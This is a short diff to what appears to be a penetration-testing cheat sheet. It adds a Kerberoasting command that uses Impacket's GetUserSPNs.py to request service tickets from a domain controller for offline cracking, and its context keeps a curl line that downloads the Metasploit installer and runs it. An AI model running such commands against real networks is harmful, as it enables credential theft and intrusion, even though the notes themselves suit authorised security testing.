@@ -56,3 +56,8 @@ awk -F ' ' '{print $1}' Macs.txt > MacsNamesOnly.txt
 ````
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
 ````
+
+## Kerberoasting
+```
+python GetUserSPNs.py -debug -request -outputfile kerberoasting.txt -dc-ip 1.1.1.1 -target-domain domain.local domain/user:password
+```
